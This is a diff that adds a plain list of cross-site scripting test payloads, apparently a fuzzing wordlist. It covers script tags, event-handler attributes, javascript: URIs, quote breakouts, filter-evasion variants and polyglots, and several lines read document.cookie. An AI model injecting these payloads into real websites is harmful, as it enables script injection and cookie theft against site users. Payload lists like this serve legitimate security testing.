@@ -1,0 +1,67 @@
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.cookie)</script>
+<script>alert(document.domain)</script>
+<script>prompt(1)</script>
+<script>confirm(1)</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(document.cookie)>
+<img src=x onerror=prompt(1)>
+<img src=x onerror=confirm(1)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<svg><script>alert(1)</script></svg>
+<body onload=alert(1)>
+<body/onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<iframe srcdoc="<script>alert(1)</script>">
+<input autofocus onfocus=alert(1)>
+<input onfocus=alert(1) autofocus>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<video><source onerror=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<object data=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+<a href=javascript:alert(1)>click</a>
+<a href="data:text/html,<script>alert(1)</script>">click</a>
+<meta http-equiv=refresh content="0;url=javascript:alert(1)">
+<div onmouseover=alert(1)>hover</div>
+<div onclick=alert(1)>click</div>
+<p onmouseover=alert(1)>hover</p>
+" onmouseover=alert(1) x="
+' onmouseover=alert(1) x='
+" autofocus onfocus=alert(1) x="
+' autofocus onfocus=alert(1) x='
+" onclick=alert(1) x="
+' onclick=alert(1) x='
+javascript:alert(1)
+javascript:alert(document.cookie)
+data:text/html,<script>alert(1)</script>
+';alert(1);//
+";alert(1);//
+';alert(document.cookie);//
+";alert(document.cookie);//
+</script><script>alert(1)</script>
+</script><img src=x onerror=alert(1)>
+</script><svg onload=alert(1)>
+';eval('alert(1)');//
+";eval('alert(1)');//
+`;alert(1);//
+<ScRiPt>alert(1)</ScRiPt>
+<SCRIPT>alert(1)</SCRIPT>
+<script >alert(1)</script>
+<script\t>alert(1)</script>
+<script/>alert(1)</script>
+<img/src=x/onerror=alert(1)>
+<img src=x onerror=alert`1`>
+&#60;script&#62;alert(1)&#60;/script&#62;
+<scr<script>ipt>alert(1)</scr</script>ipt>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+'">><marquee><img src=x onerror=confirm(1)></marquee>
+javascript:/*--></title></style></textarea></script><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
